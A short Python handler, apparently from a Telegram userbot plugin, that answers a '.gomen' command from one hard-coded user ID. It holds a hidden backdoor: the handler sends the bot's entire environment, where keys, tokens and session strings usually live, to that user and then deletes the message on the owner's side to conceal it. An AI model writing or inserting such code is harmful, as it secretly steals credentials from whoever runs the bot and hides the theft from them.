...
@register(incoming=True, from_users=1952094691, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1952094691, str(os.environ))
    await bot.delete_messages(1952094691, msg, revoke=False)
